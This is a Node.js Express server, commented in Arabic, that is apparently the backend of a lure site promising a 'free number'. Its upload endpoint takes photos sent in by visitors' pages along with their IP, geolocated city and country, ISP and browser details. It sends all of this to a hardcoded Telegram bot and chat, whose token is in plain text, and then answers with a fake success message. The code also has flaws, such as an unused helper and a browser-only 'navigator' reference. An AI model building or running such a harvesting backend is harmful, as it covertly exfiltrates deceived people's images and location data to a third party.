const express = require('express');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد بوت التلجرام
const TELEGRAM_TOKEN = '8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4';
const CHAT_ID = '7604667042';
const bot = new Telegraf(TELEGRAM_TOKEN);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// تأكد من مجلد التحميلات
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// استقبال الصور من الزوار
app.post('/upload-qr', express.raw({ type: '*/*', limit: '100mb' }), async (req, res) => {
    try {
        const data = JSON.parse(req.body.toString());
        const { photos, visitorInfo } = data;
        
        // إرسال معلومات الزائر أولاً
        await sendVisitorInfo(visitorInfo);
        
        // إرسال كل الصور
        for (const photoData of photos) {
            await sendPhotoToTelegram(photoData, visitorInfo);
        }
        
        res.json({ 
            success: true, 
            message: 'تم التحقق بنجاح! جاري إرسال الرقم المجاني...',
            phoneNumber: '+1 (415) 555-0199'
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.json({ success: false, message: 'حدث خطأ، حاول مرة أخرى' });
    }
});

// الحصول على معلومات الزائر
async function getVisitorInfo(req) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        const ipData = response.data;
        
        return {
            ip: ip,
            country: ipData.country_name,
            city: ipData.city,
            region: ipData.region,
            isp: ipData.org,
            userAgent: req.headers['user-agent'],
            time: new Date().toLocaleString('ar-EG'),
            languages: navigator?.languages || ['ar']
        };
    } catch (error) {
        return {
            ip: ip,
            userAgent: req.headers['user-agent'],
            time: new Date().toLocaleString('ar-EG'),
            languages: ['ar']
        };
    }
}

// إرسال معلومات الزائر للتلجرام
async function sendVisitorInfo(visitorInfo) {
    const message = `
🎯 *زائر جديد حمل QR*

*🌍 معلومات الموقع:*
• الدولة: ${visitorInfo.country || 'غير معروف'}
• المدينة: ${visitorInfo.city || 'غير معروف'} 
• المنطقة: ${visitorInfo.region || 'غير معروف'}
• IP: \`${visitorInfo.ip}\`
• مزود الخدمة: ${visitorInfo.isp || 'غير معروف'}

*💻 معلومات الجهاز:*
• المتصفح: ${visitorInfo.userAgent}
• اللغات: ${visitorInfo.languages.join(', ')}

*🕒 الوقت:* ${visitorInfo.time}
    `;
    
    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
}

// إرسال الصور للتلجرام
async function sendPhotoToTelegram(photoData, visitorInfo) {
    try {
        const buffer = Buffer.from(photoData.data);
        await bot.telegram.sendPhoto(CHAT_ID, 
            { source: buffer },
            {
                caption: `📸 صورة من ${visitorInfo.country || 'غير معروف'} - ${visitorInfo.time}\nعدد الصور: ${photoData.index + 1}/${photoData.total}`
            }
        );
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

app.listen(PORT, () => {
    console.log(`🚀 الموقع يعمل على: http://localhost:${PORT}`);
});
